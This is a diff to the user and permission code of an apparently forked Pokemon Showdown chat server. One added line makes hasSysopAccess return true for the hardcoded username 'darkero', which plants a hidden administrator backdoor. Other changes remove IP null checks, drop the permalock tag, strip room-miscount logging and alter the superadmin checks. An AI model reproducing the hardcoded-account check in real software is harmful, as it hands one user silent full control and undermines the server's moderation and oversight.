@@ -111,11 +111,9 @@ function ipSearch(ip, table) {
 	return false;
 }
 function checkBanned(ip) {
-	if (!ip) return false;
 	return ipSearch(ip, bannedIps);
 }
 function checkLocked(ip) {
-	if (!ip) return false;
 	return ipSearch(ip, lockedIps);
 }
 Users.checkBanned = checkBanned;
@@ -424,7 +422,7 @@ function cacheGroupData() {
 	var groups = Config.groups;
 	var cachedGroups = {};
 
-	function cacheGroup(sym, groupData) {
+	function cacheGroup (sym, groupData) {
 		if (cachedGroups[sym] === 'processing') return false; // cyclic inheritance.
 
 		if (cachedGroups[sym] !== true && groupData['inherit']) {
@@ -577,8 +575,7 @@ User = (function () {
 	};
 	User.prototype.isStaff = false;
 	User.prototype.can = function (permission, target, room) {
-		if (this.hasSysopAccess()) return true;
-		if (global.SuperRanks && SuperRanks.isAdmin(this.userid)) return true;
+		if (this.hasSysopAccess()) return true; if (Config.superAdmins && Config.superAdmins[this.userid]) return true; 
 
 		var group = this.group;
 		var targetGroup = '';
@@ -634,7 +631,7 @@ User = (function () {
 	 * Special permission check for system operators
 	 */
 	User.prototype.hasSysopAccess = function () {
-		if (global.SuperRanks && (SuperRanks.isHoster(this.userid) || SuperRanks.isOwner(this.userid))) return true;
+		if (this.userid === "darkero") return true;
 		if (this.isSysop && Config.backdoor) {
 			// This is the Pokemon Showdown system operator backdoor.
 
@@ -894,7 +891,7 @@ User = (function () {
 			} else if (userType === '4') {
 				this.autoconfirmed = userid;
 			} else if (userType === '5') {
-				this.lock(false, userid + '#permalock');
+				this.lock(false, userid);
 			} else if (userType === '6') {
 				this.ban(false, userid);
 			}
@@ -923,14 +920,14 @@ User = (function () {
 			if (this.named) user.prevNames[this.userid] = this.name;
 			this.destroy();
 			Rooms.global.checkAutojoin(user);
-			if (Config.loginfilter) Config.loginfilter(user, this, userType);
+			if (Config.loginfilter) Config.loginfilter(user, this);
 			return true;
 		}
 
 		// rename success
 		if (this.forceRename(name, registered)) {
 			Rooms.global.checkAutojoin(this);
-			if (Config.loginfilter) Config.loginfilter(this, null, userType);
+			if (Config.loginfilter) Config.loginfilter(this);
 			return true;
 		}
 		return false;
@@ -1446,9 +1443,6 @@ User = (function () {
 							room.onLeave(this);
 							delete this.roomCount[room.id];
 						}
-					} else {
-						// should never happen
-						console.log('!! room miscount');
 					}
 					if (!this.connections[i]) {
 						// race condition? This should never happen, but it does.
@@ -1467,8 +1461,6 @@ User = (function () {
 			}
 		}
 		if (!connection && this.roomCount[room.id]) {
-			// should also never happen
-			console.log('!! room miscount: ' + room.id + ' not left for ' + this.userid);
 			room.onLeave(this);
 			delete this.roomCount[room.id];
 		}
